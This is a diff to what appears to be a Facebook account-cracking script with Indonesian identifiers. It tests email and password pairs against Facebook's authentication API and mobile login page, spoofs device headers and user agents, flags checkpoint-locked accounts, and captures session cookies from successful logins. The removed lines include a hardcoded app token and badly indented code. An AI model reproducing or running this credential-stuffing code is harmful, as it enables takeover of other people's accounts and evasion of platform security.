@@ -305,7 +305,7 @@ def publik(token):
 
 def pengikut(token):
     try:
-        jid = '100000'
+        jid = '10000'
         x = requests.get("https://graph.facebook.com/me?access_token=" + token)
         y = json.loads(x.text)
         n = y['name'].upper()
@@ -961,7 +961,7 @@ def log_api_2(em,pas):
         'format': 'json', 
         'sdk_version': '2', 
         'email': em, 
-        'locale': 'ar_AR', 
+        'locale': 'en_US', 
         'password': pas, 
         'sdk': 'ios', 
         'generate_session_cookies': '1', 
@@ -976,12 +976,12 @@ def log_api_2(em,pas):
 def log_mbasic_1(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
     r = requests.Session()
-    headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
-		if "session_key" in send.text and "EAAA" in send.text:
-        return {"status":"success","email":em,"pass":pas}
-    elif 'www.facebook.com' in response.json()['error_msg']:
-        return {"status":"cp","email":em,"pass":pas}
+    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7"})
+    p = r.get("https://mbasic.facebook.com/")
+    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
     else:return {"status":"error","email":em,"pass":pas}
 def log_mbasic_2(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
